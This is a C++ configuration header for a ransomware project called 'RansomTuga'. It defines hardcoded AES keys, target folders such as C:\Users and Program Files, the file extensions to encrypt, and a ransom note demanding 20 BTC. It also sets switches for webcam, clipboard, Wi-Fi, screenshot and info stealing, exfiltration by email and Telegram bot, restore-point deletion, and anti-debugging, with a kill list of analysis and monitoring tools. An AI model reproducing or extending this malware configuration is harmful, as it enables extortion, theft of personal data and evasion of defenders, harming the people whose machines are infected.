#pragma once

// Global includes
#include "skStr.h"
#include <fstream>
#include <iostream>
#include <Windows.h>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/base64.h>

#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING
#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)


// Global variables

// Crypt settings
#define IV                 (string)skCrypt("bestransomistuga")					// Constant IV for decryption & encryption
#define KEY                (string)skCrypt("ransomtugaISthebesthereactually!")	// Constant key for decryption & encryption
#define KEYOFKEY           (string)skCrypt("tugaransomISthebesthereactually!")	// Constant key for decryption & encryption of the key in the file
#define CHECK_CONTENT      (string)skCrypt("This is a sample content!!!")		// Content of the file used to check the correct key
#define MAX_THREADS        20													// Maximum number of threads used during decryption & encryption
#define MAX_FILE_SIZE      2000000000											// Maximum file size in bytes (0 for none)
#define FILE_EXTENSION     (string)skCrypt(".TUGA")								// Encrypted files' extension
#define ENCRYPTION_MODE    (string)skCrypt("AdvancedSmartPattern")				// Encryption mode (HeadOnly, DotPattern, SmartPattern, AdvancedSmartPattern, Full/default)
#define HEAD_BYTES         10													// First bytes of the file to be encrypted (for HeadOnly, DotPattern, SmartPattern, AdvancedSmartPattern)
#define STEP_BYTES         10													// Byte step (for DotPattern)
#define PERCENT_BLOCK      75													// Percentage of bytes encrypted for each block (for SmartPattern and AdvancedSmartPattern)
#define NUM_BLOCKS         20													// Number of equally sized blocks (for AdvancedSmartPattern)

// Files path
#define DEBUG_FOLDER    (string)skCrypt(".\\debugFolder\\")							// Directory where files are encrypted in debug mode if no arguments are provided
#define WEBCAM_PATH     (string)skCrypt("C:\\Windows\\System32\\webcams\\")			// Directory where webcam images are stored (and then deleted)
#define WIFI_PATH       (string)skCrypt("C:\\Windows\\System32\\wifies\\")			// Directory where wifi files are stored (and then deleted)
#define TEMPFILE        (string)skCrypt("C:\\Windows\\System32\\temp.tmp")			// Filepath of the temp file used in some functions
#define CHECKSUM_FILE   (string)skCrypt("C:\\Windows\\System32\\ok.txt")			// Filepath of the file used to check the correct key
#define OLDWALLPAPER    (string)skCrypt("C:\\Windows\\System32\\oldWallpaper.jpg")	// Filepath of the old wallpaper
#define NEWWALLPAPER    (string)skCrypt("C:\\Windows\\System32\\newWallpaper.jpg")	// Filepath of the new wallpaper
#define INFOFILE        (string)skCrypt("C:\\Windows\\System32\\info.txt")			// Filepath of the file sent via email with all information and key
#define EMAILSENDER     (string)skCrypt("C:\\Windows\\System32\\sender.ps1")		// Filepath of the email sender
#define FILESICON       (string)skCrypt("C:\\Windows\\System32\\tugaIcon.ico")		// Filepath of the default icon of encrypted files
#define CUSTOMFILE_LOC  (string)skCrypt("C:\\customfile.extension")					// Filepath of the custom file dropped
#define TROJANFILE      (string)skCrypt("C:\\Windows\\System32\\trojanFile.jpg")	// Filepath of the real program

// Misc settings
#define CUSTOM_COMMAND		(string)skCrypt("powershell -command \"Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show('You have been fucked up by RansomTuga ransomware...', 'RansomTuga docet', 'OK', 'Error')\"")	// Custom command that runs after encryption
#define NUMBER_RETRIES     3	// Maximum retries for decryptor
#define MAX_PHOTOS         3	// Maximum number of webcam captures

/* enabling features */
#define DEBUG				true	// Enable or disable debug mode (print in console)
#define ANTIDEBUG			true	// Enable or disable anti-debug checker
#define TROJAN				false	// Enable or disable trojan (run a real program in parallel with the ransomware)
#define DROPRUN_TROJAN_FILE	false	// Enable or disable dropper & runner of the real program in trojan mode
#define TSK_REMOVER			false	// Enable or disable remover of the task managers
#define ANTI_DUMPER			true	// Enable or disable anti-dumper
#define DELETE_RESTOREPOINT false	// Enable or disable restore points deleter
#define CHANGE_FILE_ICON	false	// Enable or disable custom icon for encrypted files
#define FILE_UPLOADER		false	// Enable or disable file uploader
#define TAKE_WEBCAMS		true	// Enable or disable webcam stealer
#define STEAL_INFO			true	// Enable or disable info stealer
#define GET_CLIPBOARD		true	// Enable or disable clipboard grabber
#define GET_WIFI			true	// Enable or disable Wi-Fi grabber
#define GET_SCREENSHOT		true	// Enable or disable screenshot grabber
#define RANDOM_USERAGENT	true	// Enable or disable random user agent (if false, it uses the first one)
#define ALL_DRIVES			false	// Enable or disable the encryption of all files in every drive
#define ENABLE_BLACKLIST	true	// Enable or disable blacklist for file extension
#define ENABLE_WHITELIST	true	// Enable or disable whitelist for file extension
#define DROP_README			false	// Enable or disable README dropper
#define DROP_DECRYPTOR		false	// Enable or disable Decryptor dropper
#define DROP_CUSTOM_FILE	false	// Enable or disable custom file dropper (custom file location at the beginning of main.cpp)
#define CHANGE_WALLPAPER	false	// Enable or disable changer of wallpaper
#define BACKUP_INFOFILE		true	// Enable or disable backup maker in the current folder for infoFile in debug mode
#define SEND_EMAIL			true	// Enable or disable email sender
#define DEBUG_SEND_EMAIL	false	// Enable or disable email sender in debug mode
#define SEND_TGBOT			true	// Enable or disable telegram bot sender
#define DEBUG_SEND_TGBOT	false	// Enable or disable telegram bot sender in debug mode
#define SEND_CUSTOM_COMMAND false	// Enable or disable custom command runner after encryption
#define SELFKILL			false	// Enable or disable self-killer at the end of the program
#define MAX_RETRIES			false	// Enable or disable a maximum number of retries for decryptor
#define SELFKILL_RETRIES	false	// Enable or disable self-kill after the maximum number of retries for decryptor

// Email settings
#define SENDERMAIL      (string)skCrypt("sender_email@gmail.com")	// Sender email address
#define SENDERPSW       (string)skCrypt("samplepassword!")			// Sender email password
#define RECEIVERMAIL    (string)skCrypt("receiver_email@gmail.com")	// Receiver email address
#define EMAILSUBJECT    (string)skCrypt("RansomTuga infos")			// Subject of the email
#define EMAILBODY       (string)skCrypt("These are the infos")		// Body of the email

// Telegram settings
#define BOT_TOKEN	(string)skCrypt("0000000000:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX")	// Telegram bot token
#define CHAT_ID		(string)skCrypt("0000000000")										// Telegram chat ID (send the command /getid to @myidbot)

// Scheduled task settings
#define TASKNAME	(string)skCrypt("RansomTuga")	// Name of the scheduled task
#define MINUTES		(string)skCrypt("1")			// Run the task every x minutes (MUST BE AN INTEGER)


const std::string READMECONTENT = (std::string)skCrypt(
	"You've been hacked\n"
	"Pay me 20BTC and I'll give you the decryption key!\n"
	"Or you will become a potato :C"
); // Content of README.txt

const std::string foldersToEncrypt[] = {
	(std::string)skCrypt("C:\\Users\\"),
	(std::string)skCrypt("C:\\Program Files\\"),
	(std::string)skCrypt("C:\\Program Files (x86)\\")
}; // Folders to encrypt

const std::string safeFiles[] = {
	(std::string)skCrypt("RansomTuga.exe"),
	(std::string)skCrypt("DataDecryptor.exe"),
	(std::string)skCrypt("InfoDecryptor.exe")
}; // Files to not encrypt

const std::string badPrograms[] = {
	(std::string)skCrypt("Taskmgr"),
	(std::string)skCrypt("procexp"),
	(std::string)skCrypt("procexp64"),
	(std::string)skCrypt("procexp64a"),
	(std::string)skCrypt("AnVir"),
	(std::string)skCrypt("anvir64"),
	(std::string)skCrypt("anvirlauncher"),
	(std::string)skCrypt("VirusTotalUpload"),
	(std::string)skCrypt("ProcessHacker"),
	(std::string)skCrypt("dumpcap"),
	(std::string)skCrypt("Wireshark"),
	(std::string)skCrypt("decompile"),
	(std::string)skCrypt("ollydbg"),
	(std::string)skCrypt("tcpview"),
	(std::string)skCrypt("autoruns"),
	(std::string)skCrypt("autorunsc"),
	(std::string)skCrypt("filemon"),
	(std::string)skCrypt("procmon"),
	(std::string)skCrypt("regmon"),
	(std::string)skCrypt("idaq"),
	(std::string)skCrypt("idaq64"),
	(std::string)skCrypt("ImmunityDebugger"),
	(std::string)skCrypt("HookExplorer"),
	(std::string)skCrypt("ImportREC"),
	(std::string)skCrypt("PETools"),
	(std::string)skCrypt("LordPE"),
	(std::string)skCrypt("SysInspector"),
	(std::string)skCrypt("proc_analyzer"),
	(std::string)skCrypt("sysAnalyzer"),
	(std::string)skCrypt("sniff_hit"),
	(std::string)skCrypt("windbg"),
	(std::string)skCrypt("joeboxcontrol"),
	(std::string)skCrypt("joeboxserver"),
	(std::string)skCrypt("ResourceHacker"),
	(std::string)skCrypt("x32dbg"),
	(std::string)skCrypt("x64dbg"),
	(std::string)skCrypt("Fiddler"),
	(std::string)skCrypt("httpdebugger")
}; // Tasks to kill

const std::string blacklist[] = {
	(std::string)skCrypt("exe"),
	(std::string)skCrypt("dll"),
	(std::string)skCrypt("ini"),
	(std::string)skCrypt("dat"),
	(std::string)skCrypt("cfg")
}; // Extensions of files to not encrypt

const std::string whitelist[] = {
	(std::string)skCrypt("jpg"),
	(std::string)skCrypt("jpeg"),
	(std::string)skCrypt("pdf"),
	(std::string)skCrypt("png"),
	(std::string)skCrypt("txt"),
	(std::string)skCrypt("odt"),
	(std::string)skCrypt("xls"),
	(std::string)skCrypt("xlsx"),
	(std::string)skCrypt("ods"),
	(std::string)skCrypt("ppt"),
	(std::string)skCrypt("pptx"),
	(std::string)skCrypt("htm"),
	(std::string)skCrypt("html"),
	(std::string)skCrypt("mp3"),
	(std::string)skCrypt("wma"),
	(std::string)skCrypt("avi"),
	(std::string)skCrypt("mov"),
	(std::string)skCrypt("mp4"),
	(std::string)skCrypt("gif"),
	(std::string)skCrypt("svg"),
	(std::string)skCrypt("ai"),
	(std::string)skCrypt("zip"),
	(std::string)skCrypt("rar"),
	(std::string)skCrypt("7z"),
	(std::string)skCrypt("db"),
	(std::string)skCrypt("bin")
}; // Extensions of files to encrypt

const std::string userAgents[] = {
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36,gzip(gfe)"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/106.0.1370.52"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"),
	(std::string)skCrypt("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Edg/95.0.1020.44"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36 OPR/84.0.4316.14"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 OPR/80.0.4170.72")
}; // List of user agents


typedef unsigned char BYTE;


// Global functions
std::string aes_decrypt(std::string key, std::string cipher, std::string iv);
std::string aes_encrypt(std::string key, std::string plain, std::string iv);
std::vector<BYTE> base64_decode(const std::string&);
std::string base64_encode(BYTE const* buf, unsigned int bufLen);
